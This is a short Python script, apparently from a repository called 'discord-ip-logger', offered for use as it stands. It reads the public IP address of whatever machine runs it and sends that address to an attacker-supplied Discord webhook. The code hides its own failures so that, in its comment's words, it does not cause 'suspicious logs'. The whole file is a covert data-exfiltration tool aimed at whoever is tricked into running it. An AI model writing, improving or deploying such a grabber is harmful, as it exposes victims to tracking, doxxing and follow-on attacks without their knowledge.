# Libraries
from discord_webhook import DiscordWebhook
import requests

# Needed variables
request = requests.get(url="http://httpbin.org/ip").json()  # A request to link with data about machine ip, formatted to json 
ip = request["origin"]  # Variable containing info about ip address
github_url = "https://github.com/meth1337/discord-ip-logger"  # Link to github repository
webhook_url = "discord webhook url here"

try:
    webhook = DiscordWebhook(url=webhook_url, content=f"{ip}\nlogged by {github_url}")  # variable containing all needed info about webhook
    webhook.execute()  # sending a message to webhook
except:
    pass  # Not to cause any suspicious logs in terminal window
